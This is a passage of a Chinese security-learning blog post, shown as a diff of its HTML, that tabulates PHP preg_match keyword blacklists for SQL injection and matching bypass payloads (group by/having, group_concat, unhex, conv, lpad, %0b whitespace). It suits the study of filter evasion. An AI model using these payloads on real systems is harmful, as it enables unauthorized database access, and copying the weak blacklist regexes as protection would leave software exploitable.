class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+<p>节选自：<a target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/" data-id="ckedv7ibm0037xxty5hdx4adl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/28/xss-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-lfi/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          xss&amp;命令注入&amp;lfi
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql注入总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/c%E8%AF%AD%E8%A8%80/">c语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%BC%80%E5%8F%91/">web开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows%E7%BC%96%E7%A8%8B/">windows编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/">软件工程</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%BC%80%E5%8F%91/" rel="tag">web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%E7%BC%96%E7%A8%8B/" rel="tag">windows编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" rel="tag">网络编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" rel="tag">软件工程</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">c语言</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">web安全</a> <a href="/tags/web%E5%BC%80%E5%8F%91/" style="font-size: 15px;">web开发</a> <a href="/tags/windows%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">windows编程</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">网络编程</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" style="font-size: 10px;">软件工程</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/08/28/%E6%B4%9B%E8%B0%B7%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1-1-2-3%E7%BB%84/">洛谷刷题记录(1)(1,2,3组)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/28/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">ctfshow萌新计划刷题记录</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/">buu刷题记录1</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/28/csrf-ssrf-session%E4%BC%AA%E9%80%A0/">csrf&amp;ssrf&amp;session伪造</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/28/xxe%E9%97%AE%E9%A2%98/">xxe问题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 su29029<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
